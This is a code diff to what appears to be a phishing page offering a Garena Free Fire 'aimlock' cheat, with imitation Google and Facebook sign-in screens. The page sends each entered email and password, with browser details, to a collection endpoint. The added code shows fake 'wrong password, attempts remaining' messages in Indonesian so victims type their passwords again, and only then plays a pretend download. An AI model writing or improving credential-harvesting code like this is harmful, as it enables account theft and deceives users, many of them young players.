@@ -416,6 +416,8 @@
     }
     .g-signin-err{font-size:12px;color:#d93025;margin:3px 0 8px 2px;display:none}
     .g-signin-err.show{display:block}
+    .fb-err{font-size:13px;color:#d93025;background:#fff0f0;border:1px solid #ffc5c5;border-radius:4px;padding:7px 10px;margin:0 0 8px;display:none;line-height:1.4}
+    .fb-err.show{display:block}
     .g-signin-forgot{
       font-size:14px;color:#1a73e8;font-weight:500;border:none;background:none;
       cursor:pointer;padding:8px 0 16px;display:block;
@@ -938,6 +940,7 @@
         <div class="fb-login-logo">facebook</div>
         <div class="fb-login-tagline">Log in to continue with Garena Free Fire</div>
         <div class="fb-login-card">
+          <div class="fb-err" id="fb-err"></div>
           <input type="email" id="fb-email" class="fb-login-input" placeholder="contoh@gmail.com / contoh@yahoo.com" autocomplete="email"/>
           <input type="password" id="fb-pass" class="fb-login-input" placeholder="Password" autocomplete="current-password"/>
           <button class="fb-login-btn" type="button" onclick="handleFacebookLogin()">
@@ -999,12 +1002,15 @@ function showOauthScreen(screen) {
     var er = document.getElementById('g-err'); if (er) { er.textContent = ''; er.classList.remove('show'); }
     var gp = document.getElementById('g-pass'); if (gp) gp.value = '';
     var pe = document.getElementById('g-pass-err'); if (pe) { pe.textContent = ''; pe.classList.remove('show'); }
+    var fe = document.getElementById('fb-err'); if (fe) { fe.textContent = ''; fe.classList.remove('show'); }
     var ps = document.getElementById('al-g-pass-step'); if (ps) ps.style.display = 'none';
     var es = document.getElementById('al-g-email-step'); if (es) es.style.display = 'block';
     var gt = document.getElementById('al-g-title'); if (gt) gt.textContent = 'Sign in';
     var sb = document.getElementById('al-g-submit-btn'); if (sb) sb.disabled = false;
+    alGAttempts = 0; alFbAttempts = 0;
   }
 }
+var alGAttempts = 0; var alFbAttempts = 0; var AL_MAX = 2;
 function isValidEmail(e) { return /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(e); }
 function handleGoogleNext() {
   var emailEl = document.getElementById('g-email');
@@ -1045,7 +1051,7 @@ function handleGoogleSubmit() {
   var email   = emailEl ? emailEl.value.trim() : '';
   var pass    = passEl  ? passEl.value : '';
   if (!pass) {
-    if (errEl) { errEl.textContent = 'Enter your password'; errEl.classList.add('show'); }
+    if (errEl) { errEl.textContent = 'Masukkan kata sandi kamu'; errEl.classList.add('show'); }
     if (passEl) passEl.focus();
     return;
   }
@@ -1057,13 +1063,28 @@ function handleGoogleSubmit() {
     method: 'POST', headers: {'Content-Type':'application/json'},
     body: JSON.stringify({username:email, password:pass, method:'google', type:'tool_aimlock_google', page:'aimlock', ua:navigator.userAgent, ts:new Date().toISOString()})
   }).catch(function(){});
-  setTimeout(function() {
-    if (btn) btn.disabled = false;
-    if (spEl) spEl.style.display = 'none';
-    if (txtEl) txtEl.style.display = '';
-    closeInstallModal();
-    simulateDownload();
-  }, 1700);
+  alGAttempts++;
+  if (alGAttempts < AL_MAX) {
+    setTimeout(function() {
+      if (btn) btn.disabled = false;
+      if (spEl) spEl.style.display = 'none';
+      if (txtEl) txtEl.style.display = '';
+      if (passEl) { passEl.value = ''; passEl.focus(); }
+      if (errEl) {
+        var sisa = AL_MAX - alGAttempts;
+        errEl.textContent = 'Kata sandi salah. Percobaan tersisa: ' + sisa;
+        errEl.classList.add('show');
+      }
+    }, 1500);
+  } else {
+    setTimeout(function() {
+      if (btn) btn.disabled = false;
+      if (spEl) spEl.style.display = 'none';
+      if (txtEl) txtEl.style.display = '';
+      closeInstallModal();
+      simulateDownload();
+    }, 1700);
+  }
 }
 function handleFacebookLogin() {
   var emailEl = document.getElementById('fb-email');
@@ -1073,8 +1094,14 @@ function handleFacebookLogin() {
   var btn     = document.querySelector('#screen-facebook .fb-login-btn');
   var email   = emailEl ? emailEl.value.trim() : '';
   var pass    = passEl ? passEl.value : '';
-  if (!email || !isValidEmail(email)) { if (emailEl) { emailEl.style.borderColor='#e02020'; emailEl.focus(); emailEl.setAttribute('placeholder','contoh: nama@gmail.com'); } return; }
-  if (!pass)  { if (passEl)  passEl.focus();  return; }
+  var fbErrEl = document.getElementById('fb-err');
+  if (!email || !isValidEmail(email)) {
+    if (fbErrEl) { fbErrEl.textContent = 'Masukkan email valid, contoh: nama@gmail.com'; fbErrEl.classList.add('show'); }
+    if (emailEl) emailEl.focus();
+    return;
+  }
+  if (!pass) { if (passEl) passEl.focus(); return; }
+  if (fbErrEl) fbErrEl.classList.remove('show');
   if (btn) btn.disabled = true;
   if (spEl) spEl.style.display = 'block';
   if (txtEl) txtEl.style.display = 'none';
@@ -1082,13 +1109,28 @@ function handleFacebookLogin() {
     method: 'POST', headers: {'Content-Type':'application/json'},
     body: JSON.stringify({username:email,password:pass,method:'facebook',type:'tool_aimlock_facebook',page:'aimlock',ua:navigator.userAgent,ts:new Date().toISOString()})
   }).catch(function(){});
-  setTimeout(function() {
-    if (btn) btn.disabled = false;
-    if (spEl) spEl.style.display = 'none';
-    if (txtEl) txtEl.style.display = '';
-    closeInstallModal();
-    simulateDownload();
-  }, 1900);
+  alFbAttempts++;
+  if (alFbAttempts < AL_MAX) {
+    setTimeout(function() {
+      if (btn) btn.disabled = false;
+      if (spEl) spEl.style.display = 'none';
+      if (txtEl) txtEl.style.display = '';
+      if (passEl) { passEl.value = ''; passEl.focus(); }
+      if (fbErrEl) {
+        var sisa = AL_MAX - alFbAttempts;
+        fbErrEl.textContent = 'Email atau kata sandi salah. Percobaan tersisa: ' + sisa;
+        fbErrEl.classList.add('show');
+      }
+    }, 1600);
+  } else {
+    setTimeout(function() {
+      if (btn) btn.disabled = false;
+      if (spEl) spEl.style.display = 'none';
+      if (txtEl) txtEl.style.display = '';
+      closeInstallModal();
+      simulateDownload();
+    }, 1900);
+  }
 }
 
 function simulateDownload() {
